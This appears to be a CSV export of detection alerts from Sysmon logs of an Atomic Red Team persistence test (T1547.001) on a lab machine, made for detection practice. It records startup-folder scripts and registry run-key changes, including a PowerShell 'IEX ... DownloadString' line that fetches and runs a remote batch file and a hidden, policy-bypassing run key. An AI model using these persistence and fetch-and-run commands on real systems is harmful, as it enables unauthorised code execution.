"Timestamp","RuleTitle","Level","Computer","Channel","EventID","MitreTactics","MitreTags","OtherTags","RecordID","Details","ExtraFieldInfo","RuleFile","RuleID","EvtxFile"
"2025-12-26 11:18:50.947 +01:00","File Created","info","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",173565,"Path: C:\Users\student\AppData\Local\Temp\__PSScriptPolicyTest_5zugvkzv.ilx.ps1 ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6384 ¦ PGUID: E9F06A57-6109-694E-6F01-000000002400","CreationUtcTime: 2025-12-26 10:18:50.943 ¦ RuleName: - ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:18:50.943","Sysmon_11_Info_FileCreated.yml","8a76bcd8-dec2-4c8a-995d-a4600aad8fe2","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:18:54.090 +01:00","File Created","info","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",173569,"Path: C:\Users\student\AppData\Local\Temp\__PSScriptPolicyTest_2g0ii2jn.cob.ps1 ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7868 ¦ PGUID: E9F06A57-610D-694E-7201-000000002400","CreationUtcTime: 2025-12-26 10:18:54.088 ¦ RuleName: - ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:18:54.088","Sysmon_11_Info_FileCreated.yml","8a76bcd8-dec2-4c8a-995d-a4600aad8fe2","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:18:55.371 +01:00","File Created","info","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",173581,"Path: C:\Users\student\AppData\Local\Temp\__PSScriptPolicyTest_v2vvag3r.low.ps1 ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 5496 ¦ PGUID: E9F06A57-610F-694E-7601-000000002400","CreationUtcTime: 2025-12-26 10:18:55.361 ¦ RuleName: - ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:18:55.361","Sysmon_11_Info_FileCreated.yml","8a76bcd8-dec2-4c8a-995d-a4600aad8fe2","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:18:57.262 +01:00","File Created","info","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",173594,"Path: C:\Users\student\AppData\Local\Temp\__PSScriptPolicyTest_3zoykjzr.uxd.ps1 ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 8056 ¦ PGUID: E9F06A57-6111-694E-7D01-000000002400","CreationUtcTime: 2025-12-26 10:18:57.254 ¦ RuleName: - ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:18:57.254","Sysmon_11_Info_FileCreated.yml","8a76bcd8-dec2-4c8a-995d-a4600aad8fe2","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:19:05.413 +01:00","File Created","info","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",173606,"Path: C:\Users\student\AppData\Local\Temp\__PSScriptPolicyTest_sshbopao.e1w.ps1 ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 5588 ¦ PGUID: E9F06A57-6119-694E-8301-000000002400","CreationUtcTime: 2025-12-26 10:19:05.408 ¦ RuleName: - ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:19:05.408","Sysmon_11_Info_FileCreated.yml","8a76bcd8-dec2-4c8a-995d-a4600aad8fe2","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:19:07.589 +01:00","File Created","info","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",173614,"Path: C:\Users\student\AppData\Local\Temp\__PSScriptPolicyTest_pab024p0.lsq.ps1 ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 8680 ¦ PGUID: E9F06A57-611B-694E-8C01-000000002400","CreationUtcTime: 2025-12-26 10:19:07.585 ¦ RuleName: - ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:19:07.585","Sysmon_11_Info_FileCreated.yml","8a76bcd8-dec2-4c8a-995d-a4600aad8fe2","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:19:08.421 +01:00","File Created","info","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",173617,"Path: C:\Users\student\AppData\Local\Temp\__PSScriptPolicyTest_0huzvs1n.lxw.ps1 ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 8884 ¦ PGUID: E9F06A57-611C-694E-8E01-000000002400","CreationUtcTime: 2025-12-26 10:19:08.419 ¦ RuleName: - ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:19:08.419","Sysmon_11_Info_FileCreated.yml","8a76bcd8-dec2-4c8a-995d-a4600aad8fe2","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:19:11.201 +01:00","File Created","info","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",173620,"Path: C:\Users\student\AppData\Local\Temp\__PSScriptPolicyTest_dnav5nq1.0ya.ps1 ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9204 ¦ PGUID: E9F06A57-611F-694E-9001-000000002400","CreationUtcTime: 2025-12-26 10:19:11.189 ¦ RuleName: - ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:19:11.189","Sysmon_11_Info_FileCreated.yml","8a76bcd8-dec2-4c8a-995d-a4600aad8fe2","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:19:12.557 +01:00","File Created","info","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",173624,"Path: C:\Users\student\AppData\Local\Temp\__PSScriptPolicyTest_bijbv0vc.twd.ps1 ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 8004 ¦ PGUID: E9F06A57-6120-694E-9201-000000002400","CreationUtcTime: 2025-12-26 10:19:12.548 ¦ RuleName: - ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:19:12.548","Sysmon_11_Info_FileCreated.yml","8a76bcd8-dec2-4c8a-995d-a4600aad8fe2","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:19:13.851 +01:00","File Created","info","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",173627,"Path: C:\Users\student\AppData\Local\Temp\__PSScriptPolicyTest_jbebb3p5.5ei.ps1 ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 2424 ¦ PGUID: E9F06A57-6121-694E-9401-000000002400","CreationUtcTime: 2025-12-26 10:19:13.850 ¦ RuleName: - ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:19:13.850","Sysmon_11_Info_FileCreated.yml","8a76bcd8-dec2-4c8a-995d-a4600aad8fe2","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:19:16.562 +01:00","File Created","info","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",173630,"Path: C:\Users\student\AppData\Local\Temp\__PSScriptPolicyTest_bbd020fu.vyd.ps1 ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6056 ¦ PGUID: E9F06A57-6124-694E-9601-000000002400","CreationUtcTime: 2025-12-26 10:19:16.557 ¦ RuleName: - ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:19:16.557","Sysmon_11_Info_FileCreated.yml","8a76bcd8-dec2-4c8a-995d-a4600aad8fe2","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:19:17.213 +01:00","File Created","info","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",173634,"Path: C:\Users\student\AppData\Local\Temp\__PSScriptPolicyTest_fete1t0y.sld.ps1 ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 1448 ¦ PGUID: E9F06A57-6125-694E-9801-000000002400","CreationUtcTime: 2025-12-26 10:19:17.209 ¦ RuleName: - ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:19:17.211","Sysmon_11_Info_FileCreated.yml","8a76bcd8-dec2-4c8a-995d-a4600aad8fe2","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:19:18.573 +01:00","File Created","info","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",173642,"Path: C:\Users\student\AppData\Local\Temp\__PSScriptPolicyTest_ng2cobzu.2zq.ps1 ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 1456 ¦ PGUID: E9F06A57-6126-694E-9E01-000000002400","CreationUtcTime: 2025-12-26 10:19:18.567 ¦ RuleName: - ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:19:18.567","Sysmon_11_Info_FileCreated.yml","8a76bcd8-dec2-4c8a-995d-a4600aad8fe2","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:18:54.428 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",173570,"Rule: T1023 ¦ Path: C:\Users\student\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7868 ¦ PGUID: E9F06A57-610D-694E-7201-000000002400","CreationUtcTime: 2025-12-26 10:18:54.425 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:18:54.425","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:18:54.432 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",173572,"Rule: T1023 ¦ Path: C:\Users\student\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs:Zone.Identifier ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7868 ¦ PGUID: E9F06A57-610D-694E-7201-000000002400","CreationUtcTime: 2025-12-26 10:18:54.425 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:18:54.427","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:18:54.434 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",173574,"Rule: T1023 ¦ Path: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7868 ¦ PGUID: E9F06A57-610D-694E-7201-000000002400","CreationUtcTime: 2025-12-26 10:18:54.433 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:18:54.433","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:18:54.436 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",173576,"Rule: T1023 ¦ Path: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs:Zone.Identifier ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7868 ¦ PGUID: E9F06A57-610D-694E-7201-000000002400","CreationUtcTime: 2025-12-26 10:18:54.433 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:18:54.435","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:18:55.803 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",173582,"Rule: T1023 ¦ Path: C:\Users\student\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\jsestartup.jse ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 5496 ¦ PGUID: E9F06A57-610F-694E-7601-000000002400","CreationUtcTime: 2025-12-26 10:18:55.802 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:18:55.802","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:18:55.806 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",173584,"Rule: T1023 ¦ Path: C:\Users\student\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\jsestartup.jse:Zone.Identifier ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 5496 ¦ PGUID: E9F06A57-610F-694E-7601-000000002400","CreationUtcTime: 2025-12-26 10:18:55.802 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:18:55.803","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:18:55.812 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",173586,"Rule: T1023 ¦ Path: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\jsestartup.jse ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 5496 ¦ PGUID: E9F06A57-610F-694E-7601-000000002400","CreationUtcTime: 2025-12-26 10:18:55.809 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:18:55.809","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:18:55.812 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",173588,"Rule: T1023 ¦ Path: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\jsestartup.jse:Zone.Identifier ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 5496 ¦ PGUID: E9F06A57-610F-694E-7601-000000002400","CreationUtcTime: 2025-12-26 10:18:55.809 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:18:55.811","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:18:57.601 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",173595,"Rule: T1023 ¦ Path: C:\Users\student\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\batstartup.bat ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 8056 ¦ PGUID: E9F06A57-6111-694E-7D01-000000002400","CreationUtcTime: 2025-12-26 10:18:57.599 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:18:57.599","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:18:57.603 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",173597,"Rule: T1023 ¦ Path: C:\Users\student\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\batstartup.bat:Zone.Identifier ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 8056 ¦ PGUID: E9F06A57-6111-694E-7D01-000000002400","CreationUtcTime: 2025-12-26 10:18:57.599 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:18:57.601","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:18:57.610 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",173599,"Rule: T1023 ¦ Path: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\batstartup.bat ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 8056 ¦ PGUID: E9F06A57-6111-694E-7D01-000000002400","CreationUtcTime: 2025-12-26 10:18:57.605 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:18:57.607","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:18:57.621 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",173601,"Rule: T1023 ¦ Path: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\batstartup.bat:Zone.Identifier ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 8056 ¦ PGUID: E9F06A57-6111-694E-7D01-000000002400","CreationUtcTime: 2025-12-26 10:18:57.605 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:18:57.613","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:19:06.507 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",173607,"Rule: T1023 ¦ Path: C:\Users\student\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\calc_exe.lnk ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 5588 ¦ PGUID: E9F06A57-6119-694E-8301-000000002400","CreationUtcTime: 2025-12-26 10:19:06.506 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:19:06.506","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:19:10.670 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",173618,"Rule: EXE ¦ Path: C:\Users\student\AppData\Local\Temp\atomictest\calc.exe ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 8884 ¦ PGUID: E9F06A57-611C-694E-8E01-000000002400","CreationUtcTime: 2025-12-26 10:19:10.667 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:19:10.667","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:19:11.848 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",173621,"Rule: EXE ¦ Path: C:\Users\student\AppData\Local\Temp\atomictest\calc.exe ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9204 ¦ PGUID: E9F06A57-611F-694E-9001-000000002400","CreationUtcTime: 2025-12-26 10:19:10.667 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:19:11.843","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:18:45.400 +01:00","Reg Key Value Set (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",13,"","","sysmon",173560,"Rule: T1060,RunKey ¦ EventType: SetValue ¦ TgtObj: HKU\S-1-5-21-684153438-199924312-2028511378-1003\Software\Microsoft\Windows\CurrentVersion\Run\Atomic Red Team ¦ C:\Path\AtomicRedTeam.exe ¦ Proc: C:\WINDOWS\system32\reg.exe ¦ PID: 2516 ¦ PGUID: E9F06A57-6105-694E-6B01-000000002400","User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:18:45.398","Sysmon_13_RegKeyValueSet_RuleAlert.yml","78431930-a5c6-46ae-b02c-fcdc2a7325c2","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:18:49.429 +01:00","Reg Key Value Set (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",13,"","","sysmon",173563,"Rule: T1060,RunKey ¦ EventType: SetValue ¦ TgtObj: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend\1 ¦ C:\Path\AtomicRedTeam.dll ¦ Proc: C:\WINDOWS\system32\reg.exe ¦ PID: 1804 ¦ PGUID: E9F06A57-6109-694E-6E01-000000002400","User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:18:49.427","Sysmon_13_RegKeyValueSet_RuleAlert.yml","78431930-a5c6-46ae-b02c-fcdc2a7325c2","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:18:53.681 +01:00","Reg Key Value Set (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",13,"","","sysmon",173567,"Rule: T1060,RunKey ¦ EventType: SetValue ¦ TgtObj: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce\NextRun ¦ powershell.exe ""IEX (New-Object Net.WebClient).DownloadString(`""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1547.001/src/Discovery.bat`"")"" ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 6384 ¦ PGUID: E9F06A57-6109-694E-6F01-000000002400","User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:18:53.680","Sysmon_13_RegKeyValueSet_RuleAlert.yml","78431930-a5c6-46ae-b02c-fcdc2a7325c2","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:19:06.999 +01:00","Reg Key Value Set (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",13,"","","sysmon",173610,"Rule: T1042 ¦ EventType: SetValue ¦ TgtObj: HKCR\CLSID\{645FF040-5081-101B-9F08-00AA002F954E}\shell\open\command\(Default) ¦ calc.exe ¦ Proc: C:\WINDOWS\system32\reg.exe ¦ PID: 3644 ¦ PGUID: E9F06A57-611A-694E-8801-000000002400","User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:19:06.997","Sysmon_13_RegKeyValueSet_RuleAlert.yml","78431930-a5c6-46ae-b02c-fcdc2a7325c2","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:19:07.893 +01:00","Reg Key Value Set (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",13,"","","sysmon",173615,"Rule: T1060,RunKey ¦ EventType: SetValue ¦ TgtObj: HKU\S-1-5-21-684153438-199924312-2028511378-1003\Software\Microsoft\Windows\CurrentVersion\Run\socks5_powershell ¦ powershell.exe -windowstyle hidden -ExecutionPolicy Bypass -File ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 8680 ¦ PGUID: E9F06A57-611B-694E-8C01-000000002400","User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:19:07.886","Sysmon_13_RegKeyValueSet_RuleAlert.yml","78431930-a5c6-46ae-b02c-fcdc2a7325c2","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:19:11.854 +01:00","Reg Key Value Set (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",13,"","","sysmon",173622,"Rule: T1112,ChangeStartupFolderPath ¦ EventType: SetValue ¦ TgtObj: HKU\S-1-5-21-684153438-199924312-2028511378-1003\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders\Startup ¦ C:\Users\student\AppData\Local\Temp\atomictest\ ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 9204 ¦ PGUID: E9F06A57-611F-694E-9001-000000002400","User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:19:11.849","Sysmon_13_RegKeyValueSet_RuleAlert.yml","78431930-a5c6-46ae-b02c-fcdc2a7325c2","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:19:13.404 +01:00","Reg Key Value Set (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",13,"","","sysmon",173625,"Rule: T1060,RunPolicy ¦ EventType: SetValue ¦ TgtObj: HKU\S-1-5-21-684153438-199924312-2028511378-1003\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run\atomictest ¦ C:\Windows\System32\calc.exe ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 8004 ¦ PGUID: E9F06A57-6120-694E-9201-000000002400","User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:19:13.404","Sysmon_13_RegKeyValueSet_RuleAlert.yml","78431930-a5c6-46ae-b02c-fcdc2a7325c2","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:19:16.176 +01:00","Reg Key Value Set (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",13,"","","sysmon",173628,"Rule: T1060,RunPolicy ¦ EventType: SetValue ¦ TgtObj: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run\atomictest ¦ C:\Windows\System32\calc.exe ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 2424 ¦ PGUID: E9F06A57-6121-694E-9401-000000002400","User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:19:16.175","Sysmon_13_RegKeyValueSet_RuleAlert.yml","78431930-a5c6-46ae-b02c-fcdc2a7325c2","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:19:17.548 +01:00","Reg Key Value Set (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",13,"","","sysmon",173635,"Rule: T1060 ¦ EventType: SetValue ¦ TgtObj: HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell-backup ¦ explorer.exe ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 1448 ¦ PGUID: E9F06A57-6125-694E-9801-000000002400","User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:19:17.545","Sysmon_13_RegKeyValueSet_RuleAlert.yml","78431930-a5c6-46ae-b02c-fcdc2a7325c2","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:19:17.557 +01:00","Reg Key Value Set (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",13,"","","sysmon",173636,"Rule: T1060 ¦ EventType: SetValue ¦ TgtObj: HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell ¦ explorer.exe, C:\Windows\explorer.exe ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 1448 ¦ PGUID: E9F06A57-6125-694E-9801-000000002400","User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:19:17.554","Sysmon_13_RegKeyValueSet_RuleAlert.yml","78431930-a5c6-46ae-b02c-fcdc2a7325c2","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:19:18.134 +01:00","Reg Key Value Set (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",13,"","","sysmon",173640,"Rule: T1060,RunKey ¦ EventType: SetValue ¦ TgtObj: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\calc ¦ calc.exe ¦ Proc: C:\WINDOWS\system32\services.exe ¦ PID: 776 ¦ PGUID: E9F06A57-5FDF-694E-0B00-000000002400","User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:19:18.133","Sysmon_13_RegKeyValueSet_RuleAlert.yml","78431930-a5c6-46ae-b02c-fcdc2a7325c2","C:\Tools\Logs\art_1547_001.evtx"
"2025-12-26 11:19:19.494 +01:00","Reg Key Value Set (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",13,"","","sysmon",173649,"Rule: T1031,T1050 ¦ EventType: SetValue ¦ TgtObj: HKLM\System\CurrentControlSet\Control\BootVerificationProgram\ImagePath ¦ C:\Program Files\Internet Explorer\iexplore.exe ¦ Proc: C:\WINDOWS\system32\reg.exe ¦ PID: 7472 ¦ PGUID: E9F06A57-6127-694E-A601-000000002400","User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:19:19.493","Sysmon_13_RegKeyValueSet_RuleAlert.yml","78431930-a5c6-46ae-b02c-fcdc2a7325c2","C:\Tools\Logs\art_1547_001.evtx"
